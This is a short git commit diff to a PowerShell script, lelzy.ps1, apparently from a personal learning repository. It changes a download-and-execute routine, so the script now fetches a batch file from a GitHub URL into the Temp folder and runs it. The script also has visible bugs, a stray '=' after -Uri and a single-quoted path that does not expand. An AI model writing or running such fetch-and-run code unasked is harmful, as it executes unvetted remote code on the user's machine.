452c5d025d31d39e3a9a412d64e09d21f3c0ea41
deathlimited <denis_srk@live.com>
2017-11-17 03:48:02 +0200

    Update lelzy.ps1

--- lelzy.ps1
+++ lelzy.ps1
@@ -1,5 +1,5 @@
 $url = 'https://raw.githubusercontent.com/deathlimited/Learning/master/lel.bat'
-$outpath = '$env:Temp\myexe.exe'
+$outpath = '$env:Temp\lel.bat'
 Invoke-WebRequest -Uri = $url -OutFile $outpath
 $args = @("Comma","Separated","Arguments")
-Start-Process -Filepath "$env:Temp/myexe.exe" -ArgumentList $args
+Start-Process -Filepath "$env:Temp/lel.bat" -ArgumentList $args
